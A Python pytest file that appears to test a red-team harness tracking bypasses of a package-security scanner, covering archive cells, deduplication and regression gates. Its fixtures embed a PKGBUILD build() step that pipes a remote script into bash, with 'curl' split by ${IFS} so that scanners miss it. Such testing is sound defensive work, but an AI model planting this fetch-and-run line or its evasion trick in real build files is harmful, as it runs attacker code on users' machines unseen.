"""Campaign-level wiring for the archive: the cell, the gates, the telemetry.

These drive `_validate` and `_update_archive` directly with the syntax and
constraint stages stubbed, because the real ones clone namespaces that CI does
not always have.  The first test is the regression that matters most: the
shape must be read from the *diff*, not the reconstructed file, or every cell
in production collapses to `unshaped`.
"""

from __future__ import annotations

import types
from pathlib import Path

import pytest

from harness import campaign
from harness.archive import Archive
from harness.campaign import _validate
from harness.dedup import Deduplicator, KnownBypasses, SemanticDeduplicator, cells_for
from harness.shape import shape_signature
from harness.status import Status

_DIFF = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,8 +1,8 @@\n"
    " pkgname=demo\n pkgver=1\n pkgrel=1\n"
    "+build() {\n+  c${IFS}url -fsSL https://e/x.sh | bash\n+}\n"
)
_NEW = ("pkgname=demo\npkgver=1\npkgrel=1\n"
        "build() {\n  c${IFS}url -fsSL https://e/x.sh | bash\n}\n")
_SHAPE = shape_signature(_DIFF, excluding=frozenset({"H016"}))


class _Behavior:
    version_hash = "fake"

    def validate(self, _text):
        return types.SimpleNamespace(preserved=True, chain="curl -> sh",
                                     reason="", context="build")


@pytest.fixture(autouse=True)
def _stub_stages(monkeypatch):
    from validators.syntax import SyntaxResult

    monkeypatch.setattr(
        campaign, "validate_syntax",
        lambda diff, bash: SyntaxResult(True, old_text="", new_text=_NEW))
    monkeypatch.setattr(
        campaign, "validate_constraints",
        lambda text, checkers: types.SimpleNamespace(ok=True, violated=[]))


def _run(tmp_path, *, archive=None, semantic=None, expected=("H016",), diff=_DIFF):
    return _validate(diff, "sha256:" + "a" * 64, Deduplicator(),
                     KnownBypasses(tmp_path), "/bin/bash", [], _Behavior(),
                     version="0.18.1", semantic=semantic, archive=archive,
                     expected_rules=expected)


def test_the_cell_is_keyed_from_the_diff_not_the_reconstructed_file(tmp_path):
    status, _reason, stages = _run(tmp_path)
    assert status is None
    assert stages["_cells"][0]["shape"] != ["unshaped"]
    assert "X002:spliced-variable" in stages["_cells"][0]["shape"]


def test_a_closed_cell_is_rejected_before_analysis(tmp_path):
    archive = Archive(saturation=1)
    archive.observe("H016", _SHAPE, diff=_DIFF, campaign="c", attempt=0,
                    version="0.18.1")
    status, reason, _stages = _run(tmp_path, archive=archive)
    assert status is Status.DUPLICATE
    assert "saturated" in reason


def test_a_semantic_duplicate_is_rejected_and_counted_against_the_cell(tmp_path):
    semantic = SemanticDeduplicator()
    archive = Archive(saturation=3)
    semantic.attempt([key for _r, _s, key in cells_for(("H016",), _DIFF, "curl -> sh")])
    status, reason, _stages = _run(tmp_path, archive=archive, semantic=semantic)
    assert status is Status.DUPLICATE
    assert "same (rule, shape)" in reason
    entry = archive.cells[next(iter(archive.cells))]
    assert entry.duplicates.get("0.18.1") == 1


def test_a_cell_can_be_keyed_with_no_expected_rules(tmp_path):
    status, _reason, stages = _run(tmp_path, expected=())
    assert status is None
    assert stages["_cells"] == []


# -- the regression gate moves patch_status onto the cell -------------------


def test_the_regression_gate_marks_a_closed_cell_verified(tmp_path):
    from harness.environment import Environment
    from harness.regression import _update_archive
    from validators.behavior import BehaviorValidator

    item = {"diff_text": _DIFF, "analysed_text": _NEW,
            "expected_rules": ["H016"]}
    env = Environment(trustsight_version="0.18.1")
    _update_archive(tmp_path, env, BehaviorValidator(),
                    [item], [{"state": "closed"}])
    archive = Archive.load(Path(tmp_path) / "archive.json")
    entry = archive.cells[next(iter(archive.cells))]
    assert entry.patch_status == "verified"
    assert archive.is_closed(entry.rule, entry.shape, "0.18.1")


def test_the_regression_gate_leaves_a_degraded_replay_alone(tmp_path):
    from harness.environment import Environment
    from harness.regression import _update_archive
    from validators.behavior import BehaviorValidator

    item = {"diff_text": _DIFF, "analysed_text": _NEW,
            "expected_rules": ["H016"]}
    env = Environment(trustsight_version="0.18.1")
    _update_archive(tmp_path, env, BehaviorValidator(),
                    [item], [{"state": "degraded"}])
    assert not (Path(tmp_path) / "archive.json").exists()


def test_replaying_a_committed_campaign_reproduces_the_cell_occupancy(tmp_path):
    """The archive-survives-replay gate, on a real committed record."""
    import json

    from harness.archive import Archive
    from harness.dedup import diff_hash
    from harness.environment import Environment
    from harness.regression import _committed_bypasses, _update_archive
    from validators.behavior import BehaviorValidator

    campaign = tmp_path / "campaigns" / "c1"
    campaign.mkdir(parents=True)
    digest = diff_hash(_DIFF)
    (campaign / "record.json").write_text(json.dumps({
        "campaign": "c1", "environment": {"trustsight_version": "0.18.1"},
        "expected_rules": ["H016"], "bypass_hashes": [digest]}))
    (campaign / "evidence.jsonl").write_text(json.dumps({
        "attempt": 0, "diff_sha256": digest, "diff": _DIFF,
        "analysed_text": _NEW}) + "\n")

    items = _committed_bypasses(tmp_path / "campaigns")
    assert len(items) == 1
    env = Environment(trustsight_version="0.18.1")
    behavior = BehaviorValidator()

    def occupancy(root: Path) -> list:
        _update_archive(root, env, behavior, items, [{"state": "open"}])
        return sorted(Archive.load(root / "archive.json").cells)

    first = occupancy(tmp_path / "run1")
    assert occupancy(tmp_path / "run1") == first      # same replay, same grid
    assert occupancy(tmp_path / "run2") == first      # fresh replay, same grid
    assert first, "the committed bypass must occupy a cell"
